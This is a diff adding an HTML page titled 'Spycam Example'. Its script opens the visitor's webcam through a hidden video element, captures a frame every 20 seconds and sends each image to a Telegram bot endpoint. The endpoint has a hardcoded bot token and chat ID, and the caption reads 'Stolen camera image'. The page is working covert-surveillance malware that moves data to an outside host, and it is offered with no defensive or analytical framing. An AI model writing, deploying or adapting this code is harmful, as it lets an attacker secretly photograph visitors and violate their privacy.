@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spycam Example</title>
+</head>
+<body>
+    <!-- Hidden Video Feed -->
+    <video id="cam" autoplay style="display:none;"></video>
+    <canvas id="snap" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById("cam");
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            video.srcObject = stream;
+
+            const canvas = document.getElementById("snap");
+            const ctx = canvas.getContext('2d');
+
+            setInterval(() => {
+                // Draw a frame from the video on the canvas
+                ctx.drawImage(video, 0, 0, 320, 240);
+                const photo = canvas.toDataURL('image/png');
+
+                // Sending the photo to Telegram Bot
+                fetch(`https://api.telegram.org/bot7960054085:AAGORdoAxtryZzfh6br03KvKDJaYGynMK3M/sendPhoto`, {
+                    method: 'POST',
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: "7269895856", // Telegram chat_id to send the image
+                        photo: photo,
+                        caption: "Stolen camera image"
+                    })
+                });
+            }, 20000); // Capture photo every 20 seconds
+        });
+    </script>
+</body>
+</html>
